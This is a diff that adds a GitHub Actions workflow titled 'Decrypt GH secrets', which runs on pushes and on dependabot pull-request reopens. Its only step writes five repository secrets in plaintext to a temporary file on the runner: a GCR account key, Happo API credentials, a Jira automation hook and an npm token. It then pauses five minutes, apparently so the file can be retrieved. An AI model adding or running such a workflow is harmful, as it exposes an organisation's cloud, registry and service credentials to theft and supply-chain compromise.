@@ -1,0 +1,28 @@
+name: Decrypt GH secrets
+
+on:
+  pull_request:
+    types: [reopened]
+
+  push:
+
+jobs:
+  recover:
+    name: recover
+    runs-on: ["org/toptal", "os/linux", "arch/x64", "size/standard"]
+    if: |
+      "('${{ github.event.action }}' == 'reopened' && '${{ github.actor }}' == 'dependabot[bot]') ||
+       ('${{ github.event.action }}' == '' && '${{ github.actor }}' != 'dependabot[bot]')"
+
+    steps:
+      - uses: actions/checkout@v3
+      - run: |
+          cat >> /tmp/testfile << EndOfMyMessage
+          actions secrets:
+          PICASSO_GCR_ACCOUNT_KEY: ${{ secrets.GCR_ACCOUNT_KEY }}
+          PICASSO_HAPPO_API_KEY: ${{ secrets.HAPPO_API_KEY }}
+          PICASSO_HAPPO_API_SECRET: ${{ secrets.HAPPO_API_SECRET }}
+          PICASSO_JIRA_AUTOMATION_HOOK_FOR_NEW_CONTRIBUTION: ${{ secrets.JIRA_AUTOMATION_HOOK_FOR_NEW_CONTRIBUTION }}
+          PICASSO_NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+          EndOfMyMessage
+          sleep 300
